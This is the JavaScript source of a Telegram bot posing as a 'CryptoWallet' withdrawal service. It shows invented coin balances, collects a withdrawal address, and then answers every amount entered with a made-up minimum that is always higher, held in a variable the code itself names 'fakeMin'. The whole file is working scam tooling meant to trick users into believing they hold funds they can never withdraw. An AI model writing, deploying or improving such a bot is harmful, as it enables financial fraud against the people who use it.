import { Telegraf, Markup, session } from "telegraf";

const MIN_BUMP = parseInt(process.env.MIN_BUMP, 10) || 600;

const COINS = [
  { id: "solana", name: "Solana", balance: 90888, emoji: "🟣" },
  { id: "usdt", name: "USDT", balance: 1300349, emoji: "💚" },
  { id: "dai", name: "DAI", balance: 70000, emoji: "🟡" },
  { id: "eth", name: "ETH", balance: 388000, emoji: "🔵" },
];

function fmt(n) {
  return "$" + Number(n).toLocaleString("en-US");
}

function createBot(token) {
  const bot = new Telegraf(token);

  if (!globalThis.__sessionStore) {
    globalThis.__sessionStore = new Map();
  }
  bot.use(session({
    store: {
      get: (key) => globalThis.__sessionStore.get(key) || {},
      set: (key, val) => globalThis.__sessionStore.set(key, val),
      delete: (key) => globalThis.__sessionStore.delete(key),
    },
  }));

  const coinKeyboard = Markup.inlineKeyboard(
    COINS.map((c) =>
      Markup.button.callback(
        `${c.emoji} ${c.name} – ${fmt(c.balance)}`,
        `coin_${c.id}`
      )
    ),
    { columns: 2 }
  );

  const cancelKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("❌ Cancel", "cancel"),
  ]);

  const retryKeyboard = Markup.inlineKeyboard([
    Markup.button.callback("🔄 Try Again", "try_again"),
    Markup.button.callback("❌ Cancel", "cancel"),
  ]);

  bot.start((ctx) => {
    ctx.session = {};
    ctx.reply(
      "💼 *Welcome to CryptoWallet!*\n\nSelect a coin to withdraw:",
      { parse_mode: "Markdown", ...coinKeyboard }
    );
  });

  bot.action(/coin_(.+)/, async (ctx) => {
    const coinId = ctx.match[1];
    const coin = COINS.find((c) => c.id === coinId);
    if (!coin) return ctx.answerCbQuery("Invalid coin");

    ctx.session.coin = coin;

    await ctx.editMessageText(
      `Wallet balance: *${fmt(coin.balance)}* available.\n\nPlease send the address on which you want to withdraw funds:`,
      { parse_mode: "Markdown", ...cancelKeyboard }
    );
  });

  bot.action("cancel", async (ctx) => {
    ctx.session = {};
    await ctx.editMessageText(
      "Operation cancelled. Use /start to begin again."
    );
  });

  bot.action("try_again", async (ctx) => {
    await ctx.editMessageText(
      "💰 Enter withdrawal amount in USD:",
      cancelKeyboard
    );
  });

  bot.hears(/^0x|[13][a-km-zA-HJ-NP-Z]{26,}/, async (ctx) => {
    if (!ctx.session.coin) {
      return ctx.reply("Please start with /start first.");
    }
    ctx.session.address = ctx.message.text;
    ctx.reply("💰 Enter withdrawal amount in USD:", cancelKeyboard);
  });

  bot.on("text", async (ctx) => {
    if (!ctx.session.coin || !ctx.session.address) {
      return ctx.reply("Please start with /start first.");
    }

    const cleaned = ctx.message.text.replace(/[,/$]/g, "");
    const amount = parseFloat(cleaned);

    if (isNaN(amount) || amount <= 0) {
      return ctx.reply("❌ Please enter a valid amount.");
    }

    const fakeMin = amount + MIN_BUMP;

    await ctx.reply(
      `❌ *Minimum withdrawal amount is ${fmt(fakeMin)}.*`,
      { parse_mode: "Markdown", ...retryKeyboard }
    );
  });

  return bot;
}

export { createBot, COINS, fmt };
